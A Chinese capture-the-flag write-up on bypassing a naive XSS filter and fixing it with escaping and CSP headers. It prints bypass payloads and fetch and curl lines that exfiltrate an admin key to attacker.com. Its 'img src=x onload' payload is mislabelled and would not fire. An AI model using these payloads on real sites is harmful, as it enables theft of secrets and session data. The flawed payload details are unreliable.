# A02 Security Misconfiguration - Medium 解题思路

## 漏洞分析

本题涉及两个核心安全配置错误：

### 1. 有缺陷的XSS过滤

系统使用简单的字符串替换来防御XSS：
```python
def sanitize_input(text):
    text = text.replace('<script>', '').replace('</script>', '')
    text = text.replace('javascript:', '')
    text = text.replace('onerror=', '')
    return text
```

这种防御方式存在严重问题：
- **不区分大小写**：`<SCRIPT>`、`<ScRiPt>` 不会被过滤
- **可被双重编码绕过**：`<scr<script>ipt>` 经过过滤后变成 `<script>`
- **只过滤特定事件**：`onload=`、`onmouseover=` 等事件未被过滤
- **可被嵌套绕过**：`<scr<script>ipt>` 中内层的 `<script>` 被删除后，外层组合成完整的 `<script>`

### 2. 缺少 Content-Security-Policy 头

系统未设置 `Content-Security-Policy` (CSP) 头，这意味着：
- 任何成功注入的脚本都会被执行
- 无法限制脚本的来源（内联、外部等）
- 无法阻止 `eval()`、`data:` URI 等危险操作

### 3. 管理员页面渲染原始HTML

`/admin/view` 页面使用 `|safe` 过滤器渲染评论内容，直接执行其中的JavaScript。flag以明文形式显示在该页面的"管理员密钥"区域。

## 利用步骤

### 步骤1：分析过滤规则

通过查看页面源码或尝试提交测试payload，发现系统会：
- 删除 `<script>` 和 `</script>`
- 删除 `javascript:`
- 删除 `onerror=`

### 步骤2：构造绕过Payload

#### 方法一：双重编码/嵌套标签绕过

利用过滤器的"重叠删除"特性：

```html
<scr<script>ipt>alert(1)</scr<script>ipt>
```

过滤过程：
1. `<scr<script>ipt>` → 内层的 `<script>` 被删除 → `<script>`
2. `</scr<script>ipt>` → 内层的 `</script>` 被删除 → `</script>`
3. 最终结果：`<script>alert(1)</script>`

#### 方法二：使用未被过滤的事件处理器

```html
<img src=x onload=alert(1)>
```

或

```html
<body onload=alert(1)>
```

#### 方法三：大小写绕过

```html
<SCRIPT>alert(1)</SCRIPT>
```

#### 方法四：使用其他标签和事件

```html
<svg onload=alert(1)>
```

### 步骤3：提取管理员密钥（Flag）

提交Payload到留言板，然后访问 `/admin/view`：

```html
<scr<script>ipt>fetch('http://你的服务器/?flag='+document.getElementById('admin-key').innerText)</scr<script>ipt>
```

如果无法使用外带（OOB）服务器，也可以直接在页面中弹窗：

```html
<scr<script>ipt>alert(document.getElementById('admin-key').innerText)</scr<script>ipt>
```

或使用图片加载失败事件：

```html
<img src=x onload="document.location='http://你的服务器/?c='+document.getElementById('admin-key').innerText">
```

### 步骤4：使用curl验证（可选）

```bash
# 提交留言
curl -X POST http://<target>/comment \
  -d "name=Hacker" \
  -d "content=<img src=x onload=fetch('http://attacker.com/?flag='+document.getElementById('admin-key').innerText)>"

# 访问管理员页面查看效果
curl http://<target>/admin/view
```

## 修复建议

### 1. 正确的XSS防御 - 使用HTML转义

永远不要使用简单的字符串替换来防御XSS，应该使用框架提供的转义功能：

```python
from markupsafe import escape

def sanitize_input(text):
    return escape(text)  # 将 < 转为 &lt;，> 转为 &gt;，" 转为 &quot; 等
```

在模板中不使用 `|safe` 过滤器，让Jinja2自动转义：
```html
<div>{{ comment.content }}</div>  <!-- 自动转义 -->
```

### 2. 设置 Content-Security-Policy 头

```python
resp.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; object-src 'none';"
```

更严格的策略：
```python
resp.headers['Content-Security-Policy'] = "default-src 'none'; script-src 'none'; img-src 'self'; style-src 'self';"
```

### 3. 设置其他安全头

```python
resp.headers['X-Content-Type-Options'] = 'nosniff'
resp.headers['X-Frame-Options'] = 'DENY'
resp.headers['X-XSS-Protection'] = '1; mode=block'
resp.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
```

### 4. 使用现代前端框架

React、Vue 等框架默认会对插值内容进行HTML转义，从根本上防止XSS。

### 5. 输入验证与输出编码

- **输入验证**：使用白名单验证用户输入（如只允许特定字符）
- **输出编码**：根据输出位置选择正确的编码方式（HTML、JavaScript、URL、CSS）

### 6. 使用 HTTPOnly Cookie

如果flag或敏感信息存储在cookie中：
```python
resp.set_cookie('session', value, httponly=True, secure=True, samesite='Lax')
```
